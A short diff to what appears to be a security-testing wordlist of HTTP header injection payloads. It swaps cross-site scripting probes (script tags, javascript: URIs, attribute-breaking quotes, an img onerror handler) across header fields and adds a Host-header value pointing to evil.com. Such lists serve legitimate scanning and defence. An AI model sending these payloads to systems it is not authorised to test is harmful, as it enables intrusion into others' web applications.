@@ -1,5 +1,8 @@
+X-Forwarded-For: <script>alert(1)</script>
 User-Agent: <script>alert(1)</script>
 Referer: javascript:alert(1)
-X-Forwarded-For: <script>alert(1)</script>
-Cookie: name=<img onerror=alert(1) src=x>
-Accept-Language: en;<script>alert(1)</script>
+X-Custom-Header: "><script>alert(1)</script>
+X-Real-IP: 127.0.0.1"><script>alert(1)</script>
+X-Forwarded-Host: evil.com
+Location: javascript:alert(1)
+Content-Disposition: attachment; filename="><script>alert(1)</script>
